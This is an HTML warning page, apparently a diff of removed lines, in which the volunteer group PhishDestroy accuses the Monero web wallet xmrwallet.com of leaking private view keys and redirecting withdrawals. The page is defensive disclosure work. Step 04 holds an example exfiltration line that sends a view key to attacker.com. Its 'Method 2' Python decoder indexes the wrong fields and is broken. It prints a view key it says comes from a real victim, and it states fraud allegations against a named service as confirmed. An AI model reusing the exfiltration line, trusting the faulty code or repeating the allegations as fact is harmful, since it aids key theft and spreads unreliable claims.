-  <h1><span class="dim">DO NOT USE</span><br><span class="red">XMRWALLET</span><br><span class="dim">.COM</span></h1>
-  <p class="hero-sub">
-    <span>Confirmed:</span> your private Monero view key is transmitted to their server on every API request.
-    Transaction destination addresses are <span class="hi">substituted server-side</span>.
-    15+ documented victims. $2M+ estimated stolen. 2023–present.
-  </p>
-  <div class="hero-stats">
-    <div class="hstat"><span class="hstat-n">40+</span><span class="hstat-l">Requests leaking viewkey</span></div>
-    <div class="hstat"><span class="hstat-n">15+</span><span class="hstat-l">Confirmed victims</span></div>
-    <div class="hstat"><span class="hstat-n">$2M+</span><span class="hstat-l">Estimated stolen</span></div>
-    <div class="hstat"><span class="hstat-n">4</span><span class="hstat-l">Google trackers</span></div>
-  </div>
-  <div class="cta-row">
-    <a href="https://github.com/XMRWallet/Website/issues/36" class="btn btn-red" target="_blank">📄 Technical Proof</a>
-    <a href="#report" class="btn btn-ghost">Lost Funds? Report →</a>
-  </div>
-</section>
-
-<!-- ATTACK BREAKDOWN -->
-<section class="section" id="attack">
-  <div class="section-label">Full Technical Breakdown</div>
-  <h2 class="section-title reveal">HOW THE ATTACK<br>WORKS — STEP BY STEP</h2>
-  <p class="section-intro reveal">Every step documented with real captured traffic. From the moment you enter your key to the moment funds disappear.</p>
-
-  <div class="attack-timeline reveal">
-
-    <div class="atk-step">
-      <div class="atk-step-header">
-        <div class="atk-num">01</div>
-        <div class="atk-step-title">You enter address + viewkey — both sent to server immediately in plaintext</div>
-        <div class="atk-badge bad">CRITICAL</div>
-      </div>
-      <div class="atk-body">
-        <p class="atk-explain">The site asks for your wallet address and private view key "for syncing". Both values are sent in <strong>plaintext via POST</strong> to their PHP server. No client-side encryption. Visible in DevTools → Network tab instantly.</p>
-        <div class="code-block"><span class="c-muted">// POST https://www.xmrwallet.com/auth.php</span>
-<span class="c-muted">// Content-Type: application/x-www-form-urlencoded</span>
-
-address  = <span class="c-val">46EkQdF7iQ4i4Ah935SipgXbDSryh5yv76UnhsPXTaUYegCMJPqDN88UKCuraauhmbYBK2YzDX76E46KQHAKYV9a63vokJb</span>
-viewkey  = <span class="c-red">efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800</span>
-isnew    = <span class="c-key">0</span>   <span class="c-muted">// 0 = existing wallet, 1 = created on site</span>
-currency = <span class="c-key">xmr</span>
-
-<span class="c-muted">// Private key transmitted. Server has it. Game over.</span></div>
-      </div>
-    </div>
-
-    <div class="atk-step">
-      <div class="atk-step-header">
-        <div class="atk-num">02</div>
-        <div class="atk-step-title">Server issues session_key — your private key encoded inside, re-sent on every request</div>
-        <div class="atk-badge bad">KEY EXFIL</div>
-      </div>
-      <div class="atk-body">
-        <p class="atk-explain">The server returns a <code>session_key</code> that is not a random token — it contains your wallet address and private view key encoded in Base64. This token is re-sent on <strong>every single API call</strong>, meaning your key reaches the server 40+ times per session.</p>
-        <div class="code-block"><span class="c-muted">// session_key structure (colon-separated):</span>
-session_key = <span class="c-key">[encrypted_blob]</span>:<span class="c-val">[base64(address)]</span>:<span class="c-red">[base64(viewkey)]</span>
-
-<span class="c-muted">// Real example from captured traffic:</span>
-part[1] = <span class="c-val">NDZFa1FkRjdpUTRpNEFoOTM1U2lwZ1hi...</span>
-          ↓ base64_decode()
-          = <span class="c-val">46EkQdF7iQ4i4Ah935SipgXb...vokJb</span>  <span class="c-muted">← wallet address</span>
-
-part[2] = <span class="c-red">ZWZiYTEzZWNiOGIzNjA2NjBhM2Rj...</span>
-          ↓ base64_decode()
-          = <span class="c-red">efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800</span>
-            <span class="c-red">↑↑↑ YOUR PRIVATE VIEW KEY. IN PLAINTEXT. ↑↑↑</span>
-
-<span class="c-muted">// Verify in 5 seconds:</span>
-<span class="c-key">python3</span> -c <span class="c-val">"import base64; print(base64.b64decode('ZWZiYTEzZWNiOGIzNjA2NjBhM2RjYWFmYWY3Y2Y5OTE0OTcxM2QwNjRiOWQ2NDk5N2IyNDU0ZDU4ZWU2NzgwMA==').decode())"</span>
-<span class="c-muted">// OUTPUT: efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800</span></div>
-      </div>
-    </div>
-
-    <div class="atk-step">
-      <div class="atk-step-header">
-        <div class="atk-num">03</div>
-        <div class="atk-step-title">session_key sent to server on every action — 40+ times per session</div>
-        <div class="atk-badge warn">DATA LEAK ×40</div>
-      </div>
-      <div class="atk-body">
-        <p class="atk-explain">Every time you check balance, view transactions, open the send page, or just reload — your private view key is transmitted to the server again. Over one session this happens <strong>more than 40 times</strong>.</p>
-        <div class="code-block"><span class="c-muted">// All endpoints receiving your viewkey:</span>
-
-POST <span class="c-url">/getheightsync.php</span>     session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">×12 per session</span>
-POST <span class="c-url">/gettransactions.php</span>   session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">×10 per session</span>
-POST <span class="c-url">/getbalance.php</span>        session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">×6 per session</span>
-POST <span class="c-url">/getsubaddresses.php</span>   session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">×4 per session</span>
-POST <span class="c-url">/getoutputs.php</span>        session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">×3 per session</span>
-POST <span class="c-url">/send.html</span>             session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">send page</span>
-POST <span class="c-url">/receive.html</span>          session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">receive page</span>
-POST <span class="c-url">/dashboard.html</span>        session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">main dashboard</span>
-POST <span class="c-url">/account.html</span>          session_key=...:<span class="c-red">viewkey</span>  <span class="c-muted">settings page</span>
-POST <span class="c-red">/support_login.html</span>    session_key=...:<span class="c-red">viewkey</span>  <span class="c-red">← NOT TRIGGERED BY USER</span>
-     <span class="c-red">session_id=8de50123dab32  ← DIFFERENT session_id = OPERATOR BACKDOOR</span>
-     <span class="c-muted">// This request fired automatically at 15:06:32 UTC. You did not initiate it.</span></div>
-      </div>
-    </div>
-
-    <div class="atk-step">
-      <div class="atk-step-header">
-        <div class="atk-num">04</div>
-        <div class="atk-step-title">Google Analytics tracks every move inside your "private" wallet</div>
-        <div class="atk-badge warn">PRIVACY BREACH</div>
-      </div>
-      <div class="atk-body">
-        <p class="atk-explain">While your key leaks to the PHP server, Google simultaneously receives a full activity report. 4 trackers, 30+ requests per session. <strong>Google Tag Manager is the most dangerous</strong> — it allows the operator to inject any JavaScript without changing a single line of source code or making any GitHub commit.</p>
-        <div class="code-block"><span class="c-muted">// Trackers observed in captured traffic:</span>
-
-GET <span class="c-url">https://www.googletagmanager.com/gtm.js?id=GTM-XXXXXX</span>  <span class="c-muted">×12</span>
-    <span class="c-muted">↑ Loads arbitrary JS. Operator changes code via dashboard.</span>
-    <span class="c-muted">  Auditing the GitHub repo is USELESS — real code runs here.</span>
-
-GET <span class="c-url">https://www.google-analytics.com/analytics.js</span>         <span class="c-muted">UA-116766241-1</span>
-    <span class="c-muted">↑ Google knows: your IP, browser, time on each wallet page.</span>
-
-GET <span class="c-url">https://region1.analytics.google.com/g/collect</span>        <span class="c-muted">×5  (GA4)</span>
-    <span class="c-muted">↑ Enhanced measurement: clicks, scrolls, navigation events.</span>
-
-GET <span class="c-url">https://stats.g.doubleclick.net/g/collect</span>             <span class="c-muted">×1</span>
-    <span class="c-muted">↑ Ad network tracker. Zero legitimate reason in a financial tool.</span>
-
-<span class="c-red">// GTM + compromised viewkey = full Magecart-style attack:</span>
-<span class="c-muted">// 1. Control the GTM account (or compromise it)</span>
-<span class="c-muted">// 2. Push tag: document.location = 'https://attacker.com/?vk=' + getViewKey()</span>
-<span class="c-muted">// 3. Every user auto-exfiltrates their key. Zero code changes. Zero commits.</span></div>
-      </div>
-    </div>
-
-    <div class="atk-step">
-      <div class="atk-step-header">
-        <div class="atk-num">05</div>
-        <div class="atk-step-title">What viewkey access enables — and how funds disappear</div>
-        <div class="atk-badge bad">THEFT MECHANISM</div>
-      </div>
-      <div class="atk-body">
-        <p class="atk-explain">The private view key reveals all incoming transactions — addresses, amounts, output keys. Combined with server-side transaction processing, the operator can monitor wallets in real time and intercept withdrawals by <strong>substituting the recipient address server-side</strong>.</p>
-        <div class="code-block"><span class="c-muted">// What viewkey access enables:</span>
-
-<span class="c-val">✓</span> See all incoming transactions (sender addresses, amounts)
-<span class="c-val">✓</span> Monitor balance in real time via blockchain
-<span class="c-val">✓</span> Know when and how much was deposited
-<span class="c-val">✓</span> Derive output keys needed to prove ownership
-
-<span class="c-muted">// What the server additionally controls (processes all requests):</span>
-
-<span class="c-red">✗</span> Full spend key operation history via /gettransactions.php
-<span class="c-red">✗</span> Ability to substitute recipient address on /send.html
-<span class="c-red">✗</span> Access to /support_login.html with separate session_id
-
-<span class="c-muted">// Theft pattern (2023–2025, threshold &gt;50 XMR; 2025+ — from 1 XMR):</span>
-<span class="c-muted">// 1. Victim deposits XMR</span>
-<span class="c-muted">// 2. Server monitors via viewkey — detects incoming funds</span>
-<span class="c-muted">// 3. On withdrawal, recipient address is substituted</span>
-<span class="c-muted">// 4. Victim sees "sent", funds go to operator</span>
-<span class="c-muted">// 5. Support response: "you used a phishing clone"</span></div>
-        <div style="margin-top:16px;padding:16px 20px;background:#0A0000;border:1px solid rgba(255,32,32,0.3);border-left:3px solid var(--red);">
-          <div style="font-family:var(--mono);font-size:11px;color:var(--red);letter-spacing:1px;margin-bottom:12px;">▶ DOCUMENTED LOSSES</div>
-          <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;">
-            <div style="font-family:var(--mono);font-size:12px;"><span style="color:#FF2020">590 XMR</span> <span style="color:#444">~$177,000 — largest single</span></div>
-            <div style="font-family:var(--mono);font-size:12px;"><span style="color:#FF2020">17.44 XMR</span> <span style="color:#444">TxID documented, Trustpilot</span></div>
-            <div style="font-family:var(--mono);font-size:12px;"><span style="color:#FF2020">20 XMR</span> <span style="color:#444">overnight drain</span></div>
-            <div style="font-family:var(--mono);font-size:12px;"><span style="color:#FF2020">15+ victims</span> <span style="color:#444">documented 2023–2026</span></div>
-            <div style="font-family:var(--mono);font-size:12px;"><span style="color:#FF2020">$2M+</span> <span style="color:#444">estimated total</span></div>
-            <div style="font-family:var(--mono);font-size:12px;"><span style="color:#FF2020">Threshold dropped</span> <span style="color:#444">from 50 XMR → 1 XMR</span></div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="atk-step">
-      <div class="atk-step-header">
-        <div class="atk-num">06</div>
-        <div class="atk-step-title">Reproduce it yourself — 3 methods</div>
-        <div class="atk-badge ok">VERIFY</div>
-      </div>
-      <div class="atk-body">
-        <p class="atk-explain">Don't take our word for it. Three independent ways to confirm the finding right now.</p>
-        <div class="code-block"><span class="c-muted">// METHOD 1 — DevTools (easiest)</span>
-<span class="c-muted">// 1. Open xmrwallet.com</span>
-<span class="c-muted">// 2. F12 → Network → filter: "auth.php"</span>
-<span class="c-muted">// 3. Enter any address + viewkey</span>
-<span class="c-muted">// 4. Check Request Payload → viewkey present in plaintext</span>
-
-<span class="c-muted">// METHOD 2 — Decode session_key (Python)</span>
-<span class="c-key">import</span> base64
-
-session_key = <span class="c-val">"blob:NDZFa1FkRjdp...WI=:ZWZiYTEzZWNi...MA=="</span>
-parts = session_key.split(<span class="c-val">":"</span>)
-print(<span class="c-val">"Address:"</span>, base64.b64decode(parts[<span class="c-key">1</span> + <span class="c-key">1</span>]).decode())
-print(<span class="c-red">"ViewKey:"</span>, base64.b64decode(parts[<span class="c-key">2</span> + <span class="c-key">1</span>]).decode())
-<span class="c-muted">// → private key in plaintext</span>
-
-<span class="c-muted">// METHOD 3 — Decode our captured traffic directly</span>
-<span class="c-key">import</span> base64
-vk = <span class="c-val">"ZWZiYTEzZWNiOGIzNjA2NjBhM2RjYWFmYWY3Y2Y5OTE0OTcxM2QwNjRiOWQ2NDk5N2IyNDU0ZDU4ZWU2NzgwMA=="</span>
-print(base64.b64decode(vk).decode())
-<span class="c-muted">// OUTPUT: efba13ecb8b360660a3dcaafaf7cf99149713d064b9d64997b2454d58ee67800</span>
-<span class="c-muted">// Real key from real victim traffic captured 2026-02-18.</span></div>
-      </div>
-    </div>
-
-  </div>
-</section>
-
-<!-- GOOGLE TRACKING -->
-<section class="section" id="tracking">
-  <div class="section-label">Finding #2</div>
-  <h2 class="section-title reveal">GOOGLE WATCHES<br>YOUR WALLET</h2>
-  <p class="section-intro reveal">A service claiming to be "private" and "untraceable" loads 4 separate Google tracking systems. Every page you visit inside your wallet is reported to Google. Tag Manager makes it worse — it can inject any code without changing source.</p>
-  <div class="tracking-grid reveal">
-    <div class="tracker-item">
-      <div class="tracker-icon">📊</div>
-      <div>
-        <div class="tracker-name">Google Analytics UA-116766241-1</div>
-        <div class="tracker-desc">Records every page visit inside your wallet. IP address, browser fingerprint, session timing — all sent to Google.</div>
-      </div>
-      <div class="tracker-count">12</div>
-    </div>
-    <div class="tracker-item">
-      <div class="tracker-icon">🏷️</div>
-      <div>
-        <div class="tracker-name">Google Tag Manager</div>
-        <div class="tracker-desc">Loads arbitrary JavaScript from Google's servers. Operator can push new malicious code at any time — no source changes, no GitHub commits.</div>
-      </div>
-      <div class="tracker-count">12</div>
-    </div>
-    <div class="tracker-item">
-      <div class="tracker-icon">📈</div>
-      <div>
-        <div class="tracker-name">Google Analytics 4</div>
-        <div class="tracker-desc">region1.analytics.google.com — records enhanced events: scrolls, clicks, time on page, navigation paths.</div>
-      </div>
-      <div class="tracker-count">5</div>
-    </div>
-    <div class="tracker-item">
-      <div class="tracker-icon">🎯</div>
-      <div>
-        <div class="tracker-name">DoubleClick Ad Network</div>
-        <div class="tracker-desc">stats.g.doubleclick.net — Google advertising tracker. Zero legitimate purpose on a financial tool. Used for cross-site ad targeting.</div>
-      </div>
-      <div class="tracker-count">1</div>
-    </div>
-  </div>
-</section>
-
-<!-- INFRASTRUCTURE -->
-<section class="section" id="infra">
-  <div class="section-label">Finding #3</div>
-  <h2 class="section-title reveal">INFRASTRUCTURE<br>&amp; EVASION TACTICS</h2>
-  <p class="section-intro reveal">DDoS-Guard offshore hosting, hidden registrant, self-phishing typosquat domains, deleted GitHub issues, fake Trustpilot reviews, and paid SEO articles.</p>
-  <div class="cards reveal">
-    <div class="card">
-      <div class="card-num">IP</div>
-      <div class="card-title">186.2.165.49 — DDoS-Guard AS59692</div>
-      <div class="card-body">Offshore provider specifically chosen by operators who expect abuse complaints. Known for <strong>ignoring takedown requests</strong>. Production backend runs here.</div>
-    </div>
-    <div class="card">
-      <div class="card-num">🕵</div>
-      <div class="card-title">Hidden Registrant — NameCheap</div>
-      <div class="card-body">Domain owner identity concealed via privacy service. NameCheap is known for slow abuse response on privacy-protected domains.</div>
-    </div>
-    <div class="card">
-      <div class="card-num">🔗</div>
-      <div class="card-title">Typosquat Domain Network</div>
-      <div class="card-body">Network of lookalike domains: xmreallet.com, xmrqallet.com, xmrwalley.com, xmrwallrt.com, xmrwallwt.com. When theft is reported, response is always: <strong>"you used a phishing clone"</strong> — pointing to these.</div>
-    </div>
-    <div class="card">
-      <div class="card-num">🗑️</div>
-      <div class="card-title">Deleted Issues &amp; Reviews</div>
-      <div class="card-body">Multiple GitHub issues reporting fund theft deleted by repo owner. Negative Trustpilot reviews consistently receive identical template responses. Pattern consistent with active reputation management.</div>
-    </div>
-    <div class="card">
-      <div class="card-num">📰</div>
-      <div class="card-title">Purchased SEO Articles</div>
-      <div class="card-body">Several "best monero wallet" articles appear to be paid placements — no technical analysis, identical positive framing, no disclosures. Drive organic search traffic to the service.</div>
-    </div>
-    <div class="card">
-      <div class="card-num">PHP</div>
-      <div class="card-title">Server-Side Backend</div>
-      <div class="card-body">All wallet logic runs server-side in PHP. Balance, transactions, key verification — the server controls everything. The "client-side wallet" claim is <strong>false</strong>.</div>
-    </div>
-  </div>
-</section>
-
-<!-- VICTIMS -->
-<section class="section" id="victims">
-  <div class="section-label">Finding #4 — Victim Reports</div>
-  <h2 class="section-title reveal">DOCUMENTED<br>VICTIMS</h2>
-  <p class="section-intro reveal">Collected from Trustpilot, Sitejabber, Scam-Detector, and BitcoinTalk. 2023–2026. The operator response to every report is identical: "you used a phishing clone."</p>
-  <div class="victim-list reveal">
-    <div class="victim">
-      <div class="victim-quote">"I do deposit 590 monero 2 day gone and they steal it! Please ban this site and FBI need arest it!"</div>
-      <div class="victim-meta"><span class="amount">590 XMR stolen (~$177,000)</span><span>Sitejabber</span></div>
-    </div>
-    <div class="victim">
-      <div class="victim-quote">"I followed the owner's instructions [...] only to realize that my 17.44 XMR was all gone. I looked at my financial establishment, and the 17.44 XMR did in fact transfer to XMRwallet.com on March 8th. I have both the TxID &amp; TX Key."</div>
-      <div class="victim-meta"><span class="amount">17.44 XMR stolen</span><span>Trustpilot p.3 — TxID documented</span></div>
-    </div>
-    <div class="victim">
-      <div class="victim-quote">"This site is a scam, it worked good at first. I bookmarked it and used it for few days but one day i tried to move all funds out of it, it transferred to some other wallets instead of my mentioned wallet."</div>
-      <div class="victim-meta"><span class="amount">Funds redirected to unknown wallet</span><span>Trustpilot p.2</span></div>
-    </div>
-    <div class="victim">
-      <div class="victim-quote">"They stole $200 from me, leaving me high and dry. Don't trust them with a single cent!"</div>
-      <div class="victim-meta"><span class="amount">$200 stolen</span><span>Trustpilot p.3</span></div>
-    </div>
-    <div class="victim">
-      <div class="victim-quote">"Create wallet - put 20 xmr next day 0 xmr. Scammers owner! Its not official site its fake site."</div>
-      <div class="victim-meta"><span class="amount">20 XMR stolen overnight</span><span>Sitejabber</span></div>
-    </div>
-    <div class="victim">
-      <div class="victim-quote">"I cannot verify the transaction using the private viewing key. I wrote to technical support by email asking them to provide me with a key for transaction ID bd1e596df30fa8f1e655c79ccfbca993d71844a5... waiting for response for several days."</div>
-      <div class="victim-meta"><span class="amount">Funds inaccessible</span><span>Trustpilot</span><span>TxID: bd1e596d...</span></div>
-    </div>
-  </div>
-</section>
-
-<!-- REPORT -->
-<section class="section" id="report">
-  <div class="section-label">Take Action</div>
-  <h2 class="section-title reveal">REPORT &amp;<br>GET HELP</h2>
-  <p class="section-intro reveal">If you lost funds, document everything immediately: wallet address, TxID, TX Key, timestamps, screenshots. File reports below. Do NOT pay any "recovery service" — that is a second scam targeting victims.</p>
-  <div class="section-label reveal">Law Enforcement</div>
-  <div class="report-grid reveal">
-    <a class="report-item" href="https://ic3.gov" target="_blank"><div class="report-item-label">🇺🇸 United States</div><div class="report-item-title">FBI Internet Crime Complaint Center</div><div class="report-item-url">ic3.gov</div></a>
-    <a class="report-item" href="https://reportfraud.ftc.gov" target="_blank"><div class="report-item-label">🇺🇸 United States</div><div class="report-item-title">FTC Consumer Fraud</div><div class="report-item-url">reportfraud.ftc.gov</div></a>
-    <a class="report-item" href="https://www.actionfraud.police.uk" target="_blank"><div class="report-item-label">🇬🇧 United Kingdom</div><div class="report-item-title">Action Fraud</div><div class="report-item-url">actionfraud.police.uk</div></a>
-    <a class="report-item" href="https://www.europol.europa.eu/report-a-crime/report-cybercrime-online" target="_blank"><div class="report-item-label">🇪🇺 European Union</div><div class="report-item-title">Europol Cybercrime</div><div class="report-item-url">europol.europa.eu</div></a>
-    <a class="report-item" href="https://www.antifraudcentre-centreantifraude.ca" target="_blank"><div class="report-item-label">🇨🇦 Canada</div><div class="report-item-title">Canadian Anti-Fraud Centre</div><div class="report-item-url">antifraudcentre.ca</div></a>
-    <a class="report-item" href="https://www.interpol.int/Crimes/Cybercrime" target="_blank"><div class="report-item-label">🌍 International</div><div class="report-item-title">Interpol Cybercrime</div><div class="report-item-url">interpol.int</div></a>
-  </div>
-  <div class="section-label reveal" style="margin-top:40px">Takedown Reports</div>
-  <div class="report-grid reveal">
-    <a class="report-item" href="https://safebrowsing.google.com/safebrowsing/report_phish/" target="_blank"><div class="report-item-label">Blocks in Chrome/Firefox</div><div class="report-item-title">Google Safe Browsing</div><div class="report-item-url">safebrowsing.google.com</div></a>
-    <a class="report-item" href="https://report.netcraft.com" target="_blank"><div class="report-item-label">Used by ISPs &amp; registrars</div><div class="report-item-title">Netcraft</div><div class="report-item-url">report.netcraft.com</div></a>
-    <a class="report-item" href="https://phishtank.org/add_web_phish.php" target="_blank"><div class="report-item-label">Community blocklist</div><div class="report-item-title">PhishTank</div><div class="report-item-url">phishtank.org</div></a>
-    <a class="report-item" href="mailto:abuse@namecheap.com"><div class="report-item-label">Domain Registrar</div><div class="report-item-title">NameCheap Abuse</div><div class="report-item-url">abuse@namecheap.com</div></a>
-    <a class="report-item" href="mailto:abuse@ddos-guard.net"><div class="report-item-label">Hosting Provider</div><div class="report-item-title">DDoS-Guard Abuse</div><div class="report-item-url">abuse@ddos-guard.net</div></a>
-    <a class="report-item" href="https://github.com/XMRWallet/Website/issues/36" target="_blank"><div class="report-item-label">Evidence Thread</div><div class="report-item-title">GitHub Issue #36</div><div class="report-item-url">github.com/XMRWallet/Website/issues/36</div></a>
-  </div>
-  <div class="section-label reveal" style="margin-top:40px">Use These Instead</div>
-  <div class="wallet-grid reveal">
-    <a class="wallet-item" href="https://getmonero.org/downloads" target="_blank"><div class="wallet-platform">Desktop — Official</div><div class="wallet-name">Monero GUI</div><div class="wallet-url">getmonero.org/downloads</div><div class="wallet-note">Keys never leave your device</div></a>
-    <a class="wallet-item" href="https://featherwallet.org" target="_blank"><div class="wallet-platform">Desktop</div><div class="wallet-name">Feather Wallet</div><div class="wallet-url">featherwallet.org</div><div class="wallet-note">Open source, no analytics</div></a>
-    <a class="wallet-item" href="https://monerujo.io" target="_blank"><div class="wallet-platform">Android</div><div class="wallet-name">Monerujo</div><div class="wallet-url">monerujo.io</div><div class="wallet-note">Hardware wallet support</div></a>
-    <a class="wallet-item" href="https://cakewallet.com" target="_blank"><div class="wallet-platform">iOS / Android</div><div class="wallet-name">Cake Wallet</div><div class="wallet-url">cakewallet.com</div><div class="wallet-note">Non-custodial, open source</div></a>
-  </div>
-</section>
-
-<!-- SEO TEXT -->
-<section style="padding:60px 80px;border-top:1px solid #0D0D0D;background:#050505;">
-  <div style="max-width:860px;color:#1a1a1a;font-family:'DM Sans',sans-serif;font-size:13px;line-height:1.9;">
-    <h2 style="color:#181818;font-size:16px;margin-bottom:12px;">xmrwallet.com Security Analysis — Full Documentation</h2>
-    <p>xmrwallet.com is a Monero web wallet confirmed to transmit your private view key to their server on every API request. This analysis covers xmrwallet review, xmrwallet.com safety, and documented cases of stolen Monero. Unlike legitimate wallets such as Monero GUI (getmonero.org), Feather Wallet, or Monerujo, xmrwallet does not keep keys client-side.</p>
-    <p>Users searching for "is xmrwallet safe", "xmrwallet review", "xmrwallet stolen funds", "xmrwallet scam Reddit", "xmrwallet trustpilot", "xmrwallet lost money", "xmrwallet.com legit" should read this analysis. The private view key is transmitted 40+ times per session via the session_key parameter to endpoints including /getbalance.php, /gettransactions.php, /getheightsync.php.</p>
-    <p>Reported fund losses include: 590 XMR (~$177,000), 17.44 XMR, 20 XMR, and multiple accounts drained overnight. 15+ victims documented 2023–2026. Estimated total stolen: $2M+. Theft threshold dropped from 50 XMR (2023) to 1 XMR (2025+).</p>
-    <p>xmrwallet.com loads Google Analytics UA-116766241-1, Google Tag Manager, Google Analytics 4, and DoubleClick inside the wallet — directly contradicting all privacy claims. The service is hosted on DDoS-Guard AS59692 (186.2.165.49) to resist abuse complaints. Domain registrant hidden via NameCheap privacy service.</p>
-    <p>Research by PhishDestroy — volunteer cybersecurity organization, destroylist project (70,000+ blocked domains). Full technical evidence: github.com/XMRWallet/Website/issues/36.</p>
-  </div>
-</section>
-
-<footer>
-  <div class="footer-left">Research by <a href="https://github.com/phishdestroy" target="_blank">PhishDestroy</a> · Evidence: <a href="https://github.com/XMRWallet/Website/issues/36" target="_blank">GitHub #36</a> · 2026-02-18</div>
-  <div class="footer-right">
-    <a href="https://getmonero.org" target="_blank">✓ getmonero.org</a>
-    <a href="https://featherwallet.org" target="_blank">✓ featherwallet.org</a>
-  </div>
-</footer>
-
-<script>
-const obs = new IntersectionObserver(e => e.forEach(x => x.isIntersecting && x.target.classList.add('visible')), {threshold:0.1});
-document.querySelectorAll('.reveal').forEach(el => obs.observe(el));
-</script>
-</body>
-</html>
